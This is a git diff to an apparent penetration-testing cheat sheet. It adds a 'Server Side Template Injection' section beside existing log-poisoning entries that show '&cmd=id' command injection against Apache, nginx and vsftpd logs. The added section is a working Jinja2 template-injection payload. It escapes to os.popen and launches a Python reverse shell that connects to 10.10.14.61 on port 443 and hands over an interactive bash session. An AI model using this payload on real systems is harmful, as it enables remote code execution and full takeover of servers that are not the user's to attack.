@@ -13,6 +13,7 @@
       * [<kbd>SSH</kbd>](#Log-Poisoning-SSH)
       * [<kbd>FTP</kbd>](#Log-Poisoning-FTP)
       * [<kbd>HTTP</kbd>](#Log-Poisoning-HTTP)
+- [<kbd>Server Side Template Injection (SSTI)</kbd>](#Server-Side-Template-Injection)
 - [<kbd>UnrealIRCd</kbd>](#UnrealIRCd)
 - [<kbd>Shellshock</kbd>](#Shellshock)
   * [<kbd>SSH</kbd>](#Shellshock-SSH)
@@ -162,6 +163,7 @@
   > /var/log/vsftpd.log&cmd=id
    
   ---
+   
   # <kbd>Log Poisoning HTTP</kbd>
 
   > /var/log/apache2/access.log
@@ -181,7 +183,14 @@
   > /var/log/nginx/access.log&cmd=id
   
   ---
-  
+   
+  # <kbd>Server Side Template Injection</kbd>
+   
+  ```cmd
+  {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.61\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+  ```
+   
+  --- 
   # <kbd>UnrealIRCd</kbd>
  
   ```cmd
